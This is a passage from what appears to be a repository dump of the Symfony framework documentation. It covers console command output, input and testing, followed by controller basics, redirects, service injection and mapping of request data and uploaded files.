app:create-user\n\nAs you might expect, this command will do nothing as you didn't write any logic\nyet. Add your own logic inside the ``execute()`` method.\n\nConsole Output\n--------------\n\nThe ``execute()`` method has access to the output stream to write messages to\nthe console::\n\n    // ...\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        // outputs multiple lines to the console (adding \"\\n\" at the end of each line)\n        $output->writeln([\n            'User Creator',\n            '============',\n            '',\n        ]);\n\n        // the value returned by someMethod() can be an iterator (https://php.net/iterator)\n        // that generates and returns the messages with the 'yield' PHP keyword\n        $output->writeln($this->someMethod());\n\n        // outputs a message followed by a \"\\n\"\n        $output->writeln('Whoa!');\n\n        // outputs a message without adding a \"\\n\" at the end of the line\n        $output->write('You are about to ');\n        $output->write('create a user.');\n\n        return Command::SUCCESS;\n    }\n\nNow, try executing the command:\n\n.. code-block:: terminal\n\n    $ php bin/console app:create-user\n    User Creator\n    ============\n\n    Whoa!\n    You are about to create a user.\n\n.. _console-output-sections:\n\nOutput Sections\n~~~~~~~~~~~~~~~\n\nThe regular console output can be divided into multiple independent regions\ncalled \"output sections\". Create one or more of these sections when you need to\nclear and overwrite the output information.\n\nSections are created with the\n:method:`ConsoleOutput::section() <Symfony\\\\Component\\\\Console\\\\Output\\\\ConsoleOutput::section>`\nmethod, which returns an instance of\n:class:`Symfony\\\\Component\\\\Console\\\\Output\\\\ConsoleSectionOutput`::\n\n    // ...\n    use Symfony\\Component\\Console\\Output\\ConsoleOutputInterface;\n\n    class MyCommand extends Command\n    {\n        protected function execute(InputInterface $input, OutputInterface $output): int\n        {\n            if (!$output instanceof ConsoleOutputInterface) {\n                throw new \\LogicException('This command accepts only an instance of \"ConsoleOutputInterface\".');\n            }\n\n            $section1 = $output->section();\n            $section2 = $output->section();\n\n            $section1->writeln('Hello');\n            $section2->writeln('World!');\n            sleep(1);\n            // Output displays \"Hello\\nWorld!\\n\"\n\n            // overwrite() replaces all the existing section contents with the given content\n            $section1->overwrite('Goodbye');\n            sleep(1);\n            // Output now displays \"Goodbye\\nWorld!\\n\"\n\n            // clear() deletes all the section contents...\n            $section2->clear();\n            sleep(1);\n            // Output now displays \"Goodbye\\n\"\n\n            // ...but you can also delete a given number of lines\n            // (this example deletes the last two lines of the section)\n            $section1->clear(2);\n            sleep(1);\n            // Output is now completely empty!\n\n            // setting the max height of a section will make new lines replace the old ones\n            $section1->setMaxHeight(2);\n            $section1->writeln('Line1');\n            $section1->writeln('Line2');\n            $section1->writeln('Line3');\n\n            return Command::SUCCESS;\n        }\n    }\n\n.. note::\n\n    A new line is appended automatically when displaying information in a section.\n\nOutput sections let you manipulate the Console output in advanced ways, such as\n:ref:`displaying multiple progress bars <console-multiple-progress-bars>` which\nare updated independently and :ref:`appending rows to tables <console-modify-rendered-tables>`\nthat have already been rendered.\n\n.. warning::\n\n    Terminals only allow overwriting the visible content, so you must take into\n    account the console height when trying to write/overwrite section contents.\n\nConsole Input\n-------------\n\nUse input options or arguments to pass information to the command::\n\n    use Symfony\\Component\\Console\\Input\\InputArgument;\n\n    // ...\n    protected function configure(): void\n    {\n        $this\n            // configure an argument\n            ->addArgument('username', InputArgument::REQUIRED, 'The username of the user.')\n            // ...\n        ;\n    }\n\n    // ...\n    public function execute(InputInterface $input, OutputInterface $output): int\n    {\n        $output->writeln([\n            'User Creator',\n            '============',\n            '',\n        ]);\n\n        // retrieve the argument value using getArgument()\n        $output->writeln('Username: '.$input->getArgument('username'));\n\n        return Command::SUCCESS;\n    }\n\nNow, you can pass the username to the command:\n\n.. code-block:: terminal\n\n    $ php bin/console app:create-user Wouter\n    User Creator\n    ============\n\n    Username: Wouter\n\n.. seealso::\n\n    Read :doc:`/console/input` for more information about console options and\n    arguments.\n\nGetting Services from the Service Container\n-------------------------------------------\n\nTo actually create a new user, the command has to access some\n:doc:`services </service_container>`. Since your command is already registered\nas a service, you can use normal dependency injection. Imagine you have a\n``App\\Service\\UserManager`` service that you want to access::\n\n    // ...\n    use App\\Service\\UserManager;\n    use Symfony\\Component\\Console\\Command\\Command;\n\n    class CreateUserCommand extends Command\n    {\n        public function __construct(\n            private UserManager $userManager,\n        ){\n            parent::__construct();\n        }\n\n        // ...\n\n        protected function execute(InputInterface $input, OutputInterface $output): int\n        {\n            // ...\n\n            $this->userManager->create($input->getArgument('username'));\n\n            $output->writeln('User successfully generated!');\n\n            return Command::SUCCESS;\n        }\n    }\n\nCommand Lifecycle\n-----------------\n\nCommands have three lifecycle methods that are invoked when running the\ncommand:\n\n:method:`Symfony\\\\Component\\\\Console\\\\Command\\\\Command::initialize` *(optional)*\n    This method is executed before the ``interact()`` and the ``execute()``\n    methods. Its main purpose is to initialize variables used in the rest of\n    the command methods.\n\n:method:`Symfony\\\\Component\\\\Console\\\\Command\\\\Command::interact` *(optional)*\n    This method is executed after ``initialize()`` and before ``execute()``.\n    Its purpose is to check if some of the options/arguments are missing\n    and interactively ask the user for those values. This is the last place\n    where you can ask for missing required options/arguments. This method is\n    called before validating the input.\n    Note that it will not be called when the command is run without interaction\n    (e.g. when passing the ``--no-interaction`` global option flag).\n\n:method:`Symfony\\\\Component\\\\Console\\\\Command\\\\Command::execute` *(required)*\n    This method is executed after ``interact()`` and ``initialize()``.\n    It contains the logic you want the command to execute and it must\n    return an integer which will be used as the command `exit status`_.\n\n.. _console-testing-commands:\n\nTesting Commands\n----------------\n\nSymfony provides several tools to help you test your commands. The most\nuseful one is the :class:`Symfony\\\\Component\\\\Console\\\\Tester\\\\CommandTester`\nclass. It uses special input and output classes to ease testing without a real\nconsole::\n\n    // tests/Command/CreateUserCommandTest.php\n    namespace App\\Tests\\Command;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Console\\Application;\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\KernelTestCase;\n    use Symfony\\Component\\Console\\Tester\\CommandTester;\n\n    class CreateUserCommandTest extends KernelTestCase\n    {\n        public function testExecute(): void\n        {\n            self::bootKernel();\n            $application = new Application(self::$kernel);\n\n            $command = $application->find('app:create-user');\n            $commandTester = new CommandTester($command);\n            $commandTester->execute([\n                // pass arguments to the helper\n                'username' => 'Wouter',\n\n                // prefix the key with two dashes when passing options,\n                // e.g: '--some-option' => 'option_value',\n                // use brackets for testing array value,\n                // e.g: '--some-option' => ['option_value'],\n            ]);\n\n            $commandTester->assertCommandIsSuccessful();\n\n            // the output of the command in the console\n            $output = $commandTester->getDisplay();\n            $this->assertStringContainsString('Username: Wouter', $output);\n\n            // ...\n        }\n    }\n\nIf you are using a :doc:`single-command application </components/console/single_command_tool>`,\ncall ``setAutoExit(false)`` on it to get the command result in ``CommandTester``.\n\n.. tip::\n\n    You can also test a whole console application by using\n    :class:`Symfony\\\\Component\\\\Console\\\\Tester\\\\ApplicationTester`.\n\n.. warning::\n\n    When testing commands using the ``CommandTester`` class, console events are\n    not dispatched. If you need to test those events, use the\n    :class:`Symfony\\\\Component\\\\Console\\\\Tester\\\\ApplicationTester` instead.\n\n.. warning::\n\n    When testing commands using the :class:`Symfony\\\\Component\\\\Console\\\\Tester\\\\ApplicationTester`\n    class, don't forget to disable the auto exit flag::\n\n        $application = new Application();\n        $application->setAutoExit(false);\n\n        $tester = new ApplicationTester($application);\n\n.. warning::\n\n    When testing ``InputOption::VALUE_NONE`` command options, you must pass ``true``\n    to them::\n\n        $commandTester = new CommandTester($command);\n        $commandTester->execute(['--some-option' => true]);\n\n.. note::\n\n    When using the Console component in a standalone project, use\n    :class:`Symfony\\\\Component\\\\Console\\\\Application`\n    and extend the normal ``\\PHPUnit\\Framework\\TestCase``.\n\nWhen testing your commands, it could be useful to understand how your command\nreacts on different settings like the width and the height of the terminal, or\neven the color mode being used. You have access to such information thanks to the\n:class:`Symfony\\\\Component\\\\Console\\\\Terminal` class::\n\n    use Symfony\\Component\\Console\\Terminal;\n\n    $terminal = new Terminal();\n\n    // gets the number of lines available\n    $height = $terminal->getHeight();\n\n    // gets the number of columns available\n    $width = $terminal->getWidth();\n\n    // gets the color mode\n    $colorMode = $terminal->getColorMode();\n\n    // changes the color mode\n    $colorMode = $terminal->setColorMode(AnsiColorMode::Ansi24);\n\nLogging Command Errors\n----------------------\n\nWhenever an exception is thrown while running commands, Symfony adds a log\nmessage for it including the entire failing command. In addition, Symfony\nregisters an :doc:`event subscriber </event_dispatcher>` to listen to the\n:ref:`ConsoleEvents::TERMINATE event <console-events-terminate>` and adds a log\nmessage whenever a command doesn't finish with the ``0`` `exit status`_.\n\nUsing Events And Handling Signals\n---------------------------------\n\nWhen a command is running, many events are dispatched, one of them allows to\nreact to signals, read more in :doc:`this section </components/console/events>`.\n\nProfiling Commands\n------------------\n\nSymfony allows to profile the execution of any command, including yours. First,\nmake sure that the :ref:`debug mode <debug-mode>` and the :doc:`profiler </profiler>`\nare enabled. Then, add the ``--profile`` option when running the command:\n\n.. code-block:: terminal\n\n    $ php bin/console --profile app:my-command\n\nSymfony will now collect data about the command execution, which is helpful to\ndebug errors or check other issues. When the command execution is over, the\nprofile is accessible through the web page of the profiler.\n\n.. tip::\n\n    If you run the command in verbose mode (adding the ``-v`` option), Symfony\n    will display in the output a clickable link to the command profile (if your\n    terminal supports links). If you run it in debug verbosity (``-vvv``) you'll\n    also see the time and memory consumed by the command.\n\n.. warning::\n\n    When profiling the ``messenger:consume`` command from the :doc:`Messenger </messenger>`\n    component, add the ``--no-reset`` option to the command or you won't get any\n    profile. Moreover, consider using the ``--limit`` option to only process a few\n    messages to make the profile more readable in the profiler.\n\nLearn More\n----------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    console/*\n\nThe console component also contains a set of \"helpers\" - different small\ntools capable of helping you with different tasks:\n\n* :doc:`/components/console/helpers/questionhelper`: interactively ask the user for information\n* :doc:`/components/console/helpers/formatterhelper`: customize the output colorization\n* :doc:`/components/console/helpers/progressbar`: shows a progress bar\n* :doc:`/components/console/helpers/progressindicator`: shows a progress indicator\n* :doc:`/components/console/helpers/table`: displays tabular data as a table\n* :doc:`/components/console/helpers/debug_formatter`: provides functions to\n  output debug information when running an external program\n* :doc:`/components/console/helpers/processhelper`: allows to run processes using ``DebugFormatterHelper``\n* :doc:`/components/console/helpers/cursor`: allows to manipulate the cursor in the terminal\n\n.. _`exit status`: https://en.wikipedia.org/wiki/Exit_status\n"
        },
        {
          "name": "console",
          "type": "tree",
          "content": null
        },
        {
          "name": "contributing",
          "type": "tree",
          "content": null
        },
        {
          "name": "controller.rst",
          "type": "blob",
          "size": 30.4990234375,
          "content": "Controller\n==========\n\nA controller is a PHP function you create that reads information from the\n``Request`` object and creates and returns a ``Response`` object. The response could\nbe an HTML page, JSON, XML, a file download, a redirect, a 404 error or anything\nelse. The controller runs whatever arbitrary logic *your application* needs\nto render the content of a page.\n\n.. tip::\n\n    If you haven't already created your first working page, check out\n    :doc:`/page_creation` and then come back!\n\nA Basic Controller\n------------------\n\nWhile a controller can be any PHP callable (function, method on an object,\nor a ``Closure``), a controller is usually a method inside a controller\nclass::\n\n    // src/Controller/LuckyController.php\n    namespace App\\Controller;\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class LuckyController\n    {\n        #[Route('/lucky/number/{max}', name: 'app_lucky_number')]\n        public function number(int $max): Response\n        {\n            $number = random_int(0, $max);\n\n            return new Response(\n                '<html><body>Lucky number: '.$number.'</body></html>'\n            );\n        }\n    }\n\nThe controller is the ``number()`` method, which lives inside the\ncontroller class ``LuckyController``.\n\nThis controller is pretty straightforward:\n\n* *line 2*: Symfony takes advantage of PHP's namespace functionality to\n  namespace the entire controller class.\n\n* *line 4*: Symfony again takes advantage of PHP's namespace functionality:\n  the ``use`` keyword imports the ``Response`` class, which the controller\n  must return.\n\n* *line 7*: The class can technically be called anything, but it's suffixed\n  with ``Controller`` by convention.\n\n* *line 10*: The action method is allowed to have a ``$max`` argument thanks to the\n  ``{max}`` :doc:`wildcard in the route </routing>`.\n\n* *line 14*: The controller creates and returns a ``Response`` object.\n\nMapping a URL to a Controller\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn order to *view* the result of this controller, you need to map a URL to it via\na route. This was done above with the ``#[Route('/lucky/number/{max}')]``\n:ref:`route attribute <attribute-routes>`.\n\nTo see your page, go to this URL in your browser: http://localhost:8000/lucky/number/100\n\nFor more information on routing, see :doc:`/routing`.\n\n.. _the-base-controller-class-services:\n.. _the-base-controller-classes-services:\n\nThe Base Controller Class & Services\n------------------------------------\n\nTo aid development, Symfony comes with an optional base controller class called\n:class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController`.\nIt can be extended to gain access to helper methods.\n\nAdd the ``use`` statement atop your controller class and then modify\n``LuckyController`` to extend it:\n\n.. code-block:: diff\n\n      // src/Controller/LuckyController.php\n      namespace App\\Controller;\n\n    + use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n\n    - class LuckyController\n    + class LuckyController extends AbstractController\n      {\n          // ...\n      }\n\nThat's it! You now have access to methods like :ref:`$this->render() <controller-rendering-templates>`\nand many others that you'll learn about next.\n\nGenerating URLs\n~~~~~~~~~~~~~~~\n\nThe :method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController::generateUrl`\nmethod is just a helper method that generates the URL for a given route::\n\n    $url = $this->generateUrl('app_lucky_number', ['max' => 10]);\n\n.. _controller-redirect:\n\nRedirecting\n~~~~~~~~~~~\n\nIf you want to redirect the user to another page, use the ``redirectToRoute()``\nand ``redirect()`` methods::\n\n    use Symfony\\Component\\HttpFoundation\\RedirectResponse;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    // ...\n    public function index(): RedirectResponse\n    {\n        // redirects to the \"homepage\" route\n        return $this->redirectToRoute('homepage');\n\n        // redirectToRoute is a shortcut for:\n        // return new RedirectResponse($this->generateUrl('homepage'));\n\n        // does a permanent HTTP 301 redirect\n        return $this->redirectToRoute('homepage', [], 301);\n        // if you prefer, you can use PHP constants instead of hardcoded numbers\n        return $this->redirectToRoute('homepage', [], Response::HTTP_MOVED_PERMANENTLY);\n\n        // redirect to a route with parameters\n        return $this->redirectToRoute('app_lucky_number', ['max' => 10]);\n\n        // redirects to a route and maintains the original query string parameters\n        return $this->redirectToRoute('blog_show', $request->query->all());\n\n        // redirects to the current route (e.g. for Post/Redirect/Get pattern):\n        return $this->redirectToRoute($request->attributes->get('_route'));\n\n        // redirects externally\n        return $this->redirect('http://symfony.com/doc');\n    }\n\n.. danger::\n\n    The ``redirect()`` method does not check its destination in any way. If you\n    redirect to a URL provided by end-users, your application may be open\n    to the `unvalidated redirects security vulnerability`_.\n\n.. _controller-rendering-templates:\n\nRendering Templates\n~~~~~~~~~~~~~~~~~~~\n\nIf you're serving HTML, you'll want to render a template. The ``render()``\nmethod renders a template **and** puts that content into a ``Response``\nobject for you::\n\n    // renders templates/lucky/number.html.twig\n    return $this->render('lucky/number.html.twig', ['number' => $number]);\n\nTemplating and Twig are explained more in the\n:doc:`Creating and Using Templates article </templates>`.\n\n.. _controller-accessing-services:\n.. _accessing-other-services:\n\nFetching Services\n~~~~~~~~~~~~~~~~~\n\nSymfony comes *packed* with a lot of useful classes and functionalities, called :doc:`services </service_container>`.\nThese are used for rendering templates, sending emails, querying the database and\nany other \"work\" you can think of.\n\nIf you need a service in a controller, type-hint an argument with its class\n(or interface) name and Symfony will inject it automatically. This requires\nyour :doc:`controller to be registered as a service </controller/service>`::\n\n    use Psr\\Log\\LoggerInterface;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    // ...\n\n    #[Route('/lucky/number/{max}')]\n    public function number(int $max, LoggerInterface $logger): Response\n    {\n        $logger->info('We are logging!');\n        // ...\n    }\n\nAwesome!\n\nWhat other services can you type-hint? To see them, use the ``debug:autowiring`` console\ncommand:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:autowiring\n\n.. tip::\n\n    If you need control over the *exact* value of an argument, or require a parameter,\n    you can use the ``#[Autowire]`` attribute::\n\n        // ...\n        use Psr\\Log\\LoggerInterface;\n        use Symfony\\Component\\DependencyInjection\\Attribute\\Autowire;\n        use Symfony\\Component\\HttpFoundation\\Response;\n\n        class LuckyController extends AbstractController\n        {\n            public function number(\n                int $max,\n\n                // inject a specific logger service\n                #[Autowire(service: 'monolog.logger.request')]\n                LoggerInterface $logger,\n\n                // or inject parameter values\n                #[Autowire('%kernel.project_dir%')]\n                string $projectDir\n            ): Response\n            {\n                $logger->info('We are logging!');\n                // ...\n            }\n        }\n\n    You can read more about this attribute in :ref:`autowire-attribute`.\n\nLike with all services, you can also use regular\n:ref:`constructor injection <services-constructor-injection>` in your\ncontrollers.\n\nFor more information about services, see the :doc:`/service_container` article.\n\nGenerating Controllers\n----------------------\n\nTo save time, you can install `Symfony Maker`_ and tell Symfony to generate a\nnew controller class:\n\n.. code-block:: terminal\n\n    $ php bin/console make:controller BrandNewController\n\n    created: src/Controller/BrandNewController.php\n    created: templates/brandnew/index.html.twig\n\nIf you want to generate an entire CRUD from a Doctrine :doc:`entity </doctrine>`,\nuse:\n\n.. code-block:: terminal\n\n    $ php bin/console make:crud Product\n\n    created: src/Controller/ProductController.php\n    created: src/Form/ProductType.php\n    created: templates/product/_delete_form.html.twig\n    created: templates/product/_form.html.twig\n    created: templates/product/edit.html.twig\n    created: templates/product/index.html.twig\n    created: templates/product/new.html.twig\n    created: templates/product/show.html.twig\n\nManaging Errors and 404 Pages\n-----------------------------\n\nWhen things are not found, you should return a 404 response. To do this, throw a\nspecial type of exception::\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException;\n\n    // ...\n    public function index(): Response\n    {\n        // retrieve the object from database\n        $product = ...;\n        if (!$product) {\n            throw $this->createNotFoundException('The product does not exist');\n\n            // the above is just a shortcut for:\n            // throw new NotFoundHttpException('The product does not exist');\n        }\n\n        return $this->render(/* ... */);\n    }\n\nThe :method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController::createNotFoundException`\nmethod is just a shortcut to create a special\n:class:`Symfony\\\\Component\\\\HttpKernel\\\\Exception\\\\NotFoundHttpException`\nobject, which ultimately triggers a 404 HTTP response inside Symfony.\n\nIf you throw an exception that extends or is an instance of\n:class:`Symfony\\\\Component\\\\HttpKernel\\\\Exception\\\\HttpException`, Symfony will\nuse the appropriate HTTP status code. Otherwise, the response will have a 500\nHTTP status code::\n\n    // this exception ultimately generates a 500 status error\n    throw new \\Exception('Something went wrong!');\n\nIn every case, an error page is shown to the end user and a full debug\nerror page is shown to the developer (i.e. when you're in \"Debug\" mode - see\n:ref:`page-creation-environments`).\n\nTo customize the error page that's shown to the user, see the\n:doc:`/controller/error_pages` article.\n\n.. _controller-request-argument:\n\nThe Request object as a Controller Argument\n-------------------------------------------\n\nWhat if you need to read query parameters, grab a request header or get access\nto an uploaded file? That information is stored in Symfony's ``Request``\nobject. To access it in your controller, add it as an argument and\n**type-hint it with the Request class**::\n\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    // ...\n\n    public function index(Request $request): Response\n    {\n        $page = $request->query->get('page', 1);\n\n        // ...\n    }\n\n:ref:`Keep reading <request-object-info>` for more information about using the\nRequest object.\n\n.. _controller_map-request:\n\nAutomatic Mapping Of The Request\n--------------------------------\n\nIt is possible to automatically map request's payload and/or query parameters to\nyour controller's action arguments with attributes.\n\nMapping Query Parameters Individually\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nLet's say a user sends you a request with the following query string:\n``https://example.com/dashboard?firstName=John&lastName=Smith&age=27``.\nThanks to the :class:`Symfony\\\\Component\\\\HttpKernel\\\\Attribute\\\\MapQueryParameter`\nattribute, arguments of your controller's action can be automatically fulfilled::\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Attribute\\MapQueryParameter;\n\n    // ...\n\n    public function dashboard(\n        #[MapQueryParameter] string $firstName,\n        #[MapQueryParameter] string $lastName,\n        #[MapQueryParameter] int $age,\n    ): Response\n    {\n        // ...\n    }\n\n``#[MapQueryParameter]`` can take an optional argument called ``filter``. You can use the\n`Validate Filters`_ constants defined in PHP::\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Attribute\\MapQueryParameter;\n\n    // ...\n\n    public function dashboard(\n        #[MapQueryParameter(filter: \\FILTER_VALIDATE_REGEXP, options: ['regexp' => '/^\\w+$/'])] string $firstName,\n        #[MapQueryParameter] string $lastName,\n        #[MapQueryParameter(filter: \\FILTER_VALIDATE_INT)] int $age,\n    ): Response\n    {\n        // ...\n    }\n\n.. _controller-mapping-query-string:\n\nMapping The Whole Query String\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAnother possibility is to map the entire query string into an object that will hold\navailable query parameters. Let's say you declare the following DTO with its\noptional validation constraints::\n\n    namespace App\\Model;\n\n    use Symfony\\Component\\Validator\\Constraints as Assert;\n\n    class UserDto\n    {\n        public function __construct(\n            #[Assert\\NotBlank]\n            public string $firstName,\n\n            #[Assert\\NotBlank]\n            public string $lastName,\n\n            #[Assert\\GreaterThan(18)]\n            public int $age,\n        ) {\n        }\n    }\n\nYou can then use the :class:`Symfony\\\\Component\\\\HttpKernel\\\\Attribute\\\\MapQueryString`\nattribute in your controller::\n\n    use App\\Model\\UserDto;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Attribute\\MapQueryString;\n\n    // ...\n\n    public function dashboard(\n        #[MapQueryString] UserDto $userDto\n    ): Response\n    {\n        // ...\n    }\n\nYou can customize the validation groups used during the mapping and also the\nHTTP status to return if the validation fails::\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    // ...\n\n    public function dashboard(\n        #[MapQueryString(\n            validationGroups: ['strict', 'edit'],\n            validationFailedStatusCode: Response::HTTP_UNPROCESSABLE_ENTITY\n        )] UserDto $userDto\n    ): Response\n    {\n        // ...\n    }\n\nThe default status code returned if the validation fails is 404.\n\nIf you need a valid DTO even when the request query string is empty, set a\ndefault value for your controller arguments::\n\n    use App\\Model\\UserDto;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Attribute\\MapQueryString;\n\n    // ...\n\n    public function dashboard(\n        #[MapQueryString] UserDto $userDto = new UserDto()\n    ): Response\n    {\n        // ...\n    }\n\n.. _controller-mapping-request-payload:\n\nMapping Request Payload\n~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen creating an API and dealing with other HTTP methods than ``GET`` (like\n``POST`` or ``PUT``), user's data are not stored in the query string\nbut directly in the request payload, like this:\n\n.. code-block:: json\n\n    {\n        \"firstName\": \"John\",\n        \"lastName\": \"Smith\",\n        \"age\": 28\n    }\n\nIn this case, it is also possible to directly map this payload to your DTO by\nusing the :class:`Symfony\\\\Component\\\\HttpKernel\\\\Attribute\\\\MapRequestPayload`\nattribute::\n\n    use App\\Model\\UserDto;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Attribute\\MapRequestPayload;\n\n    // ...\n\n    public function dashboard(\n        #[MapRequestPayload] UserDto $userDto\n    ): Response\n    {\n        // ...\n    }\n\nThis attribute allows you to customize the serialization context as well\nas the class responsible of doing the mapping between the request and\nyour DTO::\n\n    public function dashboard(\n        #[MapRequestPayload(\n            serializationContext: ['...'],\n            resolver: App\\Resolver\\UserDtoResolver\n        )]\n        UserDto $userDto\n    ): Response\n    {\n        // ...\n    }\n\nYou can also customize the validation groups used, the status code to return if\nthe validation fails as well as supported payload formats::\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    // ...\n\n    public function dashboard(\n        #[MapRequestPayload(\n            acceptFormat: 'json',\n            validationGroups: ['strict', 'read'],\n            validationFailedStatusCode: Response::HTTP_NOT_FOUND\n        )] UserDto $userDto\n    ): Response\n    {\n        // ...\n    }\n\nThe default status code returned if the validation fails is 422.\n\n.. tip::\n\n    If you build a JSON API, make sure to declare your route as using the JSON\n    :ref:`format <routing-format-parameter>`. This will make the error handling\n    output a JSON response in case of validation errors, rather than an HTML page::\n\n        #[Route('/dashboard', name: 'dashboard', format: 'json')]\n\nMake sure to install `phpstan/phpdoc-parser`_ and `phpdocumentor/type-resolver`_\nif you want to map a nested array of specific DTOs::\n\n    public function dashboard(\n        #[MapRequestPayload] EmployeesDto $employeesDto\n    ): Response\n    {\n        // ...\n    }\n\n    final class EmployeesDto\n    {\n        /**\n         * @param UserDto[] $users\n         */\n        public function __construct(\n            public readonly array $users = []\n        ) {}\n    }\n\nInstead of returning an array of DTO objects, you can tell Symfony to transform\neach DTO object into an array and return something like this:\n\n.. code-block:: json\n\n    [\n        {\n            \"firstName\": \"John\",\n            \"lastName\": \"Smith\",\n            \"age\": 28\n        },\n        {\n            \"firstName\": \"Jane\",\n            \"lastName\": \"Doe\",\n            \"age\": 30\n        }\n    ]\n\nTo do so, map the parameter as an array and configure the type of each element\nusing the ``type`` option of the attribute::\n\n    public function dashboard(\n        #[MapRequestPayload(type: UserDto::class)] array $users\n    ): Response\n    {\n        // ...\n    }\n\n.. versionadded:: 7.1\n\n    The ``type`` option of ``#[MapRequestPayload]`` was introduced in Symfony 7.1.\n\n.. _controller_map-uploaded-file:\n\nMapping Uploaded Files\n~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony provides an attribute called ``#[MapUploadedFile]`` to map one or more\n``UploadedFile`` objects to controller arguments::\n\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Attribute\\MapUploadedFile;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class UserController extends AbstractController\n    {\n        #[Route('/user/picture', methods: ['PUT'])]\n        public function changePicture(\n            #[MapUploadedFile] UploadedFile $picture,\n        ): Response {\n            // ...\n        }\n    }\n\nIn this example, the associated :doc:`argument resolver <controller/value_resolver>`\nfetches the ``UploadedFile`` based on the argument name (``$picture``). If no file\nis submitted, an ``HttpException`` is thrown. You can change this by making the\ncontroller argument nullable:\n\n.. code-block:: php-attributes\n\n    #[MapUploadedFile]\n    ?UploadedFile $document\n\nThe ``#[MapUploadedFile]`` attribute also allows to pass a list of constraints\nto apply to the uploaded file::\n\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Attribute\\MapUploadedFile;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    use Symfony\\Component\\Validator\\Constraints as Assert;\n\n    class UserController extends AbstractController\n    {\n        #[Route('/user/picture', methods: ['PUT'])]\n        public function changePicture(\n            #[MapUploadedFile([\n                new Assert\\File(mimeTypes: ['image/png', 'image/jpeg']),\n                new Assert\\Image(maxWidth: 3840, maxHeight: 2160),\n            ])]\n            UploadedFile $picture,\n        ): Response {\n            // ...\n        }\n    }\n\nThe validation constraints are checked before injecting the ``UploadedFile`` into\nthe controller argument. If there's a constraint violation, an ``HttpException``\nis thrown and the controller's action is not executed.\n\nIf you need to upload a collection of files, map them to an array or a variadic\nargument. The given constraint will be applied to all files and if any of them\nfails, an ``HttpException`` is thrown:\n\n.. code-block:: php-attributes\n\n    #[MapUploadedFile(new Assert\\File(mimeTypes: ['application/pdf']))]\n    array $documents\n\n    #[MapUploadedFile(new Assert\\File(mimeTypes: ['application/pdf']))]\n    UploadedFile ...$documents\n\nUse the ``name`` option to rename the uploaded file to a custom value:\n\n.. code-block:: php-attributes\n\n    #[MapUploadedFile(name: 'something-else')]\n    UploadedFile $document\n\nIn addition, you can change the status code of the HTTP exception thrown when\nthere are constraint violations:\n\n.. code-block:: php-attributes\n\n    #[MapUploadedFile(\n        constraints: new Assert\\File(maxSize: '2M'),\n        validationFailedStatusCode: Response::HTTP_REQUEST_ENTITY_TOO_LARGE\n    )]\n    UploadedFile $document\n\n.. versionadded:: 7.1\n\n    The ``#[MapUploadedFile]`` attribute was introduced in Symfony 7.1.\n\nManaging the Session\n--------------------\n\nYou can store special messages, called \"flash\" messages, on the user's session.\nBy design, flash messages are meant to be used exactly once: they vanish from\nthe session automatically as soon as you retrieve them. This feature makes\n\"flash\" messages particularly great for storing user notifications.\n\nFor example, imagine you're processing a :doc:`form </forms>` submission::\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        use Symfony\\Component\\HttpFoundation\\Request;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        // ...\n\n        public function update(Request $request): Response\n        {\n            // ...\n\n            if ($form->isSubmitted() && $form->isValid()) {\n                // do some sort of processing\n\n                $this->addFlash(\n                    'notice',\n                    'Your changes were saved!'\n                );\n                // $this->addFlash() is equivalent to $request->getSession()->getFlashBag()->add()\n\n                return $this->redirectToRoute(/* ... */);\n            }\n\n            return $this->render(/* ... */);\n        }\n\n:ref:`Reading <session-intro>` for more information about using Sessions.\n\n.. _request-object-info:\n\nThe Request and Response Object\n-------------------------------\n\nAs mentioned :ref:`earlier <controller-request-argument>`, Symfony will\npass the ``Request`` object to any controller argument that is type-hinted with\nthe ``Request`` class::\n\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    public function index(Request $request): Response\n    {\n        $request->isXmlHttpRequest(); // is it an Ajax request?\n\n        $request->getPreferredLanguage(['en', 'fr']);\n\n        // 